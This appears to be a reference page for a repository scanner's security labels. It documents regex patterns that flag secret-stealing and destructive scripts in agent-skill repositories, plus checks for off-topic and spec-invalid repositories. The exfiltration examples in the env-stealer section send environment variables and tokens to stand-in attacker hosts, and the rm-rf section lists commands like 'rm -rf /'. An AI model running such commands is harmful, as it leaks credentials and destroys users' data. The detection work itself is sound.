# Security Label Detection Reference

Detection patterns used by `analyze-repos.py` to assign security signal labels.
These are heuristics — false positives are possible. Open an issue to contest.

## `env-stealer` 🚨

Applied when scripts or workflows appear to exfiltrate environment variables
or secrets to external destinations.

**Detection patterns (regex):**

```
(env|printenv|set)\s*\|.*curl
```
Example: `env | curl -X POST https://attacker.com`

```
curl.*\$\{?GITHUB_TOKEN
```
Example: `curl -H "Auth: $GITHUB_TOKEN" https://external.com`

```
curl.*\$\{?secrets\.
```
Example (GitHub Actions): `curl ... "${{ secrets.MY_SECRET }}" https://external.com`

```
wget.*\$(env|HOME|USER|PATH)
```
Example: `wget https://attacker.com?data=$(env)`

**Severity:** Critical. Do not install or run skills from repos with this label
without fully auditing the scripts.

---

## `rm-rf` 💥

Applied when scripts contain destructive `rm -rf` targeting broad or variable
paths without explicit safeguards.

**Detection patterns (regex):**

```
rm\s+-[a-zA-Z]*r[a-zA-Z]*f[a-zA-Z]*\s+(\/\*?|~\/?\*?|"\$)
```
Matches: `rm -rf /`, `rm -rf /*`, `rm -rf ~/`, `rm -rf "$VAR"`

```
rm\s+-rf\s+\$\{?\w+\}?  (not followed by # ...dry)
```
Matches: `rm -rf $TMPDIR` (without a dry-run comment)

**Not flagged:**
- `rm -rf /tmp/my-specific-dir` — specific known path
- `rm -rf "$BUILD_DIR" # dry-run: no-op` — commented safeguard

**Severity:** High. Review the full script context before deciding if this is
a false positive.

---

## `misleading` ⚠️

Applied when a repository has the `agent-skills` topic but shows no meaningful
connection to the Agent Skills specification.

**Heuristic (all conditions must be true):**
1. No `SKILL.md` file found anywhere in the repository tree
2. Repository description contains none of: `skill`, `agent`, `claude`, `llm`, `ai agent`, `SKILL.md`, `agentskills`, `assistant`, `copilot`
3. Topics do not contain: `skill`, `agent`, `claude`, `llm`
4. Primary language is not Python, Shell, TypeScript, or JavaScript

**Severity:** Low. The repository is likely using the topic for SEO or made a
mistake. It is not dangerous, just off-topic.

---

## `spec-errors` ❌

Applied when a `SKILL.md` file is found but its frontmatter fails validation
against the agentskills.io specification.

**Common causes:**
- `name` contains uppercase letters or underscores
- `name` starts or ends with a hyphen, or contains consecutive hyphens
- `description` exceeds 1024 characters
- `description` is empty
- `name` does not match the directory name

**Severity:** Informational. The skill may still work in some agents, but it
is not guaranteed to be compatible with all spec-compliant implementations.

---

## False positives

The detection patterns are intentionally conservative to avoid false positives,
but they are not perfect. Common false positives:

- `rm-rf`: cleanup scripts that `rm -rf` a known build directory
- `env-stealer`: scripts that pipe `env` to a local process (not a URL)
- `misleading`: repos in early development with no description yet

If you believe a label is incorrect, open an issue in
`roebi/awesome-agent-skills` with a link to the specific file and an
explanation.
